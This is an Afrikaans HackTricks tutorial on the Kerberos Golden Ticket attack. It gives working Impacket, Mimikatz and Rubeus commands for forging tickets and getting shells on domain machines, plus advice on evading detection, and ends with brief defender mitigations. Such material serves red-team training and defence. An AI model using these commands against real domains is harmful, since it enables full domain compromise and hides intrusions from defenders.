# Goue Kaartjie

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Goue kaartjie

'n **Goue Kaartjie**-aanval behels die **skepping van 'n geldige Kaartjie-verlening Kaartjie (TGT) wat enige gebruiker naboots** deur die gebruik van die **NTLM-hash van die Active Directory (AD) krbtgt-rekening**. Hierdie tegniek is veral voordelig omdat dit **toegang tot enige diens of masjien** binne die domein as die nagebootste gebruiker moontlik maak. Dit is belangrik om te onthou dat die **krbtgt-rekening se geloofsbriewe nooit outomaties opgedateer word nie**.

Om die NTLM-hash van die krbtgt-rekening te **verkry**, kan verskeie metodes gebruik word. Dit kan onttrek word uit die **Local Security Authority Subsystem Service (LSASS) proses** of die **NT Directory Services (NTDS.dit) lêer** wat op enige Domeinbeheerder (DC) binne die domein geleë is. Verder is die **uitvoering van 'n DCsync-aanval** 'n ander strategie om hierdie NTLM-hash te verkry, wat uitgevoer kan word met behulp van gereedskap soos die **lsadump::dcsync-module** in Mimikatz of die **secretsdump.py-skrip** deur Impacket. Dit is belangrik om te beklemtoon dat **domein-admin-voorregte of 'n soortgelyke vlak van toegang tipies vereis word** om hierdie operasies uit te voer.

Alhoewel die NTLM-hash as 'n lewensvatbare metode vir hierdie doel dien, word dit **sterk aanbeveel** om kaartjies te vervals met behulp van die Advanced Encryption Standard (AES) Kerberos-sleutels (AES128 en AES256) vir operasionele veiligheidsredes.


{% code title="Vanaf Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% code title="Vanaf Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Sodra** jy die **goue kaartjie ingespuit** het, kan jy toegang kry tot die gedeelde lêers **(C$)** en dienste en WMI uitvoer, sodat jy **psexec** of **wmiexec** kan gebruik om 'n skulp te verkry (dit lyk asof jy nie 'n skulp via winrm kan kry nie).

### Om algemene opsporing te omseil

Die mees algemene maniere om 'n goue kaartjie op te spoor, is deur **Kerberos-verkeer te ondersoek** op die draad. Standaard **teken Mimikatz die TGT vir 10 jaar**, wat as abnormaal sal uitstaan in daaropvolgende TGS-versoeke wat daarmee gemaak word.

`Lifetime : 3/11/2021 12:39:57 NM ; 3/9/2031 12:39:57 NM ; 3/9/2031 12:39:57 NM`

Gebruik die parameters `/startoffset`, `/endin` en `/renewmax` om die beginverskuiwing, duur en die maksimum hernuwings te beheer (alles in minute).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Ongelukkig word die leeftyd van die TGT nie in 4769 se logboeke aangeteken nie, so jy sal hierdie inligting nie in die Windows-gebeurtenislogboeke vind nie. Wat jy egter kan korreleer, is **die sien van 4769's sonder 'n voorafgaande 4768**. Dit is **nie moontlik om 'n TGS aan te vra sonder 'n TGT nie**, en as daar geen rekord van 'n TGT-uitreiking is nie, kan ons aflei dat dit buite lyn vervals is.

Om hierdie opsporing te **omseil**, kyk na die diamantkaartjies:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Versagting

* 4624: Rekening Aanmelding
* 4672: Admin Aanmelding
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Ander klein truuks wat verdedigers kan doen, is om **waarskuwings te gee vir 4769's vir sensitiewe gebruikers**, soos die verstek domeinadministrateurrekening.

## Verwysings
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
